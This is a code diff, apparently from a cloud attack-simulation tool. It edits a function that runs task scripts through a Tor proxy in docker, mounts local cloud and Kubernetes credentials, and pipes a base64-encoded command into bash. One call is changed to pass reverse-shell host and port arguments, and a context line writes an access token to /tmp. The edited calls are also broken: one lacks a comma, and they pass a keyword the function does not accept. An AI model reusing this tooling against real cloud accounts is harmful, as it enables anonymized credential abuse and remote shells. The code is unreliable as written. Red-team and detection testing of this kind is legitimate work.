@@ -162,7 +162,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     else:
                         log(f"file not found: {file}")
 
-            def credentialed_access_tor(csp, jobname, cwd, script):
+            def credentialed_access_tor(csp, jobname, cwd, script, args=""):
                 # start torproxy docker
                 if not csp in ["aws", "gcp", "azure"]:
                     raise Exception(f'Unknown csp used {csp}')
@@ -213,8 +213,9 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         local_kube_creds = os.path.expandvars("$HOME/.kube")
                         container_kube_creds = "/root/.kube"
 
+                        log(f"Starting tor tunneled docker...")
                         payload = base64.b64encode(
-                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "/{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script}'.encode('utf-8'))
+                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "/{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}'.encode('utf-8'))
                         log(f"Running payload: {payload}")
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -323,10 +324,11 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log("prep_local_env complete")
                 log("running credentialed_access_tor...")
                 credentialed_access_tor(
-                    csp,
-                    task_name,
-                    f'/{task_name}',
-                    f'{task_name}.sh'
+                    csp=csp,
+                    task_name=task_name,
+                    cwd=f'/{task_name}',
+                    script=f'{task_name}.sh',
+                    args=""
                 )
                 log("credentialed_access_tor complete")
             # update to add 15 minute timeout
@@ -343,10 +345,11 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log("prep_local_env complete")
                 log("running credentialed_access_tor...")
                 credentialed_access_tor(
-                    csp,
-                    task_name,
-                    f'/{task_name}',
-                    f'{task_name}.sh'
+                    csp=csp,
+                    task_name=task_name,
+                    cwd=f'/{task_name}',
+                    script=f'{task_name}.sh'
+                    args=""
                 )
                 log("credentialed_access_tor complete")
             elif task_name == "socksscan":
@@ -429,10 +432,11 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log("prep_local_env complete")
                 log("running credentialed_access_tor...")
                 credentialed_access_tor(
-                    csp,
-                    task_name,
-                    f'/{task_name}',
-                    f'{task_name}.sh'
+                    csp=csp,
+                    task_name=task_name,
+                    cwd=f'/{task_name}',
+                    script=f'{task_name}.sh',
+                    args='--reverse-shell-host=${reverse_shell_host} --reverse-shell-port=${reverse_shell_port}'
                 )
                 log("credentialed_access_tor complete")
 
